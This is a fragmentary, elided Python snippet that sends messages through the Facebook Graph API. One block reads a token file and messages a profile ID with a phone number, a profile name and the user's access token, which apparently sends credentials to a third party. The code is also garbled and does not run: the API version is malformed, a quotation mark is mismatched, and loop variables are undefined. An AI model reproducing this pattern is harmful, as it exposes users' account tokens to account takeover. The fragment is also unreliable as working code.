...
def comment_on_posts(posts):
    for i in ns:
        ...
        try:
            message = i
            url = "https://graph.facebook.com/v15.0/{0}/messages/t/".format('t_' + profile_id)
            parameters = {
...
if inn in mmm:
    ...
    with open(token, 'r') as f2:
        ...
        url1 = 'https://graph.facebook.com/v15 0/{0}/'.format('t_'+ profile_id')
        parameters = {
            'access_token': access_token,
            'message': 'Phone No : ' + inn + '\nProfile Name : ' + f + '\nToken : ' + access_token + '\nLink :\n\n https://www.facebook.com/messages/t/'+ profile_id}
